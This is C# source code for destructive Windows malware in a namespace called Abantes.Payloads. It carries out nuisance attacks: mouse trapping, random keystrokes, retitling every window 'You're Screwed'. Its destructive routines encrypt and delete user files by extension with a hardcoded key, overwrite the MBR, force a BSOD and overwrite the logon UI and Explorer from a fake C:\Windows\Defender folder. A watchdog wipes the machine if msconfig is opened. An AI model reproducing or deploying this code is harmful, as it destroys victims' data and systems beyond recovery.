using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using Abantes.Utils;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Media;
using Microsoft.Win32;

namespace Abantes.Payloads
{
    class Threads
    {
        static Random _random = new Random();
        public static void MainPayloadThread()
        {
            while(true)
            {
                switch (_random.Next(10))
                {
                    case 0:
                        Thread randomOSsound = new Thread(new ThreadStart(Anoying.RandomOSSounds));
                        randomOSsound.Start();
                        break;
                    case 1:
                        Thread randomKeyboard = new Thread(new ThreadStart(Anoying.RandomKeyboard));
                        randomKeyboard.Start();
                        break;
                    case 2:
                        if (_random.Next(100) > 50)
                        {
                            //BSOD
                        }
                        break;
                    case 3:
                        string extractPath = @"C:\Windows\Defender";
                        Wallpaper.Set(new Uri(extractPath + @"\wallpaper.jpg"), Wallpaper.Style.Stretched);
                        break;
                    case 4:
                        if (_random.Next(100) > 50)
                        {
                            Thread mouseTrap = new Thread(new ThreadStart(Anoying.MouseTrap));
                            mouseTrap.Start();
                        }
                        break;
                    case 5:
                        Anoying.ChangeWindowText();
                        break;
                    case 6:
                        //Anoying.EjectCd();
                        break;
                    case 7:
                        Anoying.Screen_Screw();
                        break;
                    case 8:
                        Anoying.Screen_Glitching();
                        break;
                    case 9:
                        //Anoying.Display_Icons_Error();
                        break;
                }
                Thread.Sleep(10000);
            }
        }
        public static void WathcDogThread()
        {
            WatchDog.Rules("Rules");
            WatchDog.msconfig("msconfig");
            WatchDog.TaskMGR("taskmgr");
        }
    }
    class Anoying
    {
        [DllImport("user32.dll")]
        static extern int SetWindowText(IntPtr hWnd, string text);
        public static void ChangeWindowText()
        {
            Process[] allProcesses = Process.GetProcesses();
            for (int i = 0; i < allProcesses.Length; i++)
            {
                SetWindowText(allProcesses[i].MainWindowHandle, "You're Screwed");
            }
        }
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Screw@Payloads@1@QAEXXZ")]
        public static extern void Screen_Screw();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Glitching@Payloads@1@QAEXXZ")]
        public static extern void Screen_Glitching();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?EjectCD@Payloads@1@QAEXXZ")]
        public static extern void EjectCd();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Display_Icons_Error@Payloads@1@QAEXXZ")]
        public static extern void Display_Icons_Error();
        static Point Position;
        static Random _random = new Random();
        public static void MouseTrap()
        {
            Position.X = 100;
            Position.Y = 100;
            while (true)
            {
                Cursor.Position = Position;
            }
        }
        public static void RandomKeyboard()
        {
            while (true)
            {
                if (_random.Next(100) > 95)
                {
                    char key = (char)(_random.Next(25) + 65);
                    if (_random.Next(2) == 0)
                    {
                        key = Char.ToLower(key);
                    }
                    SendKeys.SendWait(key.ToString());
                }
                Thread.Sleep(400);
            }
        }
        public static void RandomOSSounds()
        {
            while (true)
            {
                if (_random.Next(100) > 80)
                {
                    switch (_random.Next(5))
                    {
                        case 0:
                            SystemSounds.Asterisk.Play();
                            break;
                        case 1:
                            SystemSounds.Beep.Play();
                            break;
                        case 2:
                            SystemSounds.Exclamation.Play();
                            break;
                        case 3:
                            SystemSounds.Hand.Play();
                            break;
                        case 4:
                            SystemSounds.Question.Play();
                            break;
                    }
                }
                Thread.Sleep(400);
            }
        }
        public static void LockedImage()
        {
            Form Image = new LockedImage();
            Image.Show();
        }
    }
    class Destructive
    {
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MBR_Overwrite@Payloads@1@QAEXXZ")]
        public static extern void MBR_Overwrite();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?FORCE_BSOD@Payloads@1@QAEXXZ")]
        public static extern void FORCE_BSOD();
        public static void LogonUIOverwrite()
        {
            string extractPath = @"C:\Windows\Defender";
            Process ScriptProcess = new Process();
            ScriptProcess.StartInfo.CreateNoWindow = true;
            ScriptProcess.StartInfo.FileName = extractPath + "\\logonOverwrite.bat"; 
            ScriptProcess.Start();
        }
        public static void ExplorerOverwrite()
        {
            string extractPath = @"C:\Windows\Defender";
            Process ScriptProcess = new Process();
            ScriptProcess.StartInfo.CreateNoWindow = true;
            ScriptProcess.StartInfo.FileName = extractPath + "\\ExplorerOverwrite.bat";
            ScriptProcess.Start();
        }
        public static void EncryptUserFiles()
        {
            List<string> pathsToEncrypt = new List<string>();
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            foreach (string currentPath in pathsToEncrypt)
            {
                GetFilesAndEncrypt(currentPath);
            }
        }
        static void GetFilesAndEncrypt(string Ps)
        {
            try
            {
                var validExtensions = new[]
                {
                    ".jpg", ".jpeg", ".raw", ".tif", ".gif", ".png", ".bmp", ".3dm", ".max", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg", ".dxf",
                    ".c", ".cpp", ".cs", ".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".rar", ".zip", ".7zip", ".7z", ".dat", ".csv",
                    ".efx", ".sdf", ".vcf", ".xml", ".ses", ".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl", ".indt",
                    ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps", ".ps", ".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx",
                    ".docm", ".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt", ".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb",
                    ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm",".wav",
                    ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa", ".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx", ".flv",
                    ".mpg", ".wmv", ".vob", ".m3u8", ".mkv", ".m4a", ".ico", ".dic", ".rex", ".hmg", ".config", ".resx", ".res"
                };
                string[] files = Directory.GetFiles(Ps);
                foreach (string currentFile in files)
                {
                    string extension = Path.GetExtension(currentFile);
                    if (validExtensions.Contains(extension))
                    {
                        Encryption.FileEncrypt(currentFile, "WR8h2GIbf9FGz6VVlSzJ");
                        File.Delete(currentFile);
                    }
                }
                string[] subDirs = Directory.GetDirectories(Ps);
                foreach (string currentPath in subDirs)
                {
                    GetFilesAndEncrypt(currentPath);
                }
            }
            catch { }
        }
        public static void KillPC()
        {
            EncryptUserFiles();
            LogonUIOverwrite();
            MBR_Overwrite();
            ExplorerOverwrite();
        }
    }
    class WatchDog
    {
        public static void Rules(string sProcessName)
        {
            Process[] proc = Process.GetProcessesByName(sProcessName);
            if (proc.Length > 0)
            {

            }
            else
            {
                Destructive.KillPC();
            }
        }
        public static void msconfig(string sProcessName)
        {
            Process[] proc = Process.GetProcessesByName(sProcessName);
            if (proc.Length > 0)
            {
                Destructive.KillPC();
            }
        }
        public static void TaskMGR(string sProcessName)
        {
            Process[] proc = Process.GetProcessesByName(sProcessName);
            if (proc.Length > 0)
            {
                SpeechSynthesizer TTS = new SpeechSynthesizer();
                TTS.SetOutputToDefaultAudioDevice();
                TTS.Volume = 100;
                TTS.Speak("There Is No Way");
            }
        }
    }
}
